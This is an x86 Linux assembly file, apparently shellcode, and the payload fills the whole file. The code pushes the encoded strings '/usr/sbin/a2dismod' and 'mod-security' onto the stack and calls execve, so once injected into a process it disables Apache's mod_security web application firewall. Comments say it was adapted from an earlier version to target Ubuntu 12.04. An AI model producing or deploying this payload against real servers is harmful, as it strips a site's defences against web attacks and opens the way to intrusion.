global _start

section .text
_start:
xor eax,eax
push eax
cdq
push dword 0x646f6d73
push dword 0x69643261
push dword 0x2f6e6962
push dword 0x732f7273
push dword 0x752f2f2f
mov ebx,esp
push eax		; Added to original as Ubuntu 12.04 uses mod-security not mod-security2
;push byte +0x32	; Removed from original as Ubuntu 12.04 uses mod-security not mod-security2
push dword 0x79746972
push dword 0x75636573
push dword 0x2d646f6d
mov ecx,esp
xor edx,edx
mov al,0xb
push edx
push ecx
push ebx
mov ecx,esp
mov edx,esp
int 0x80
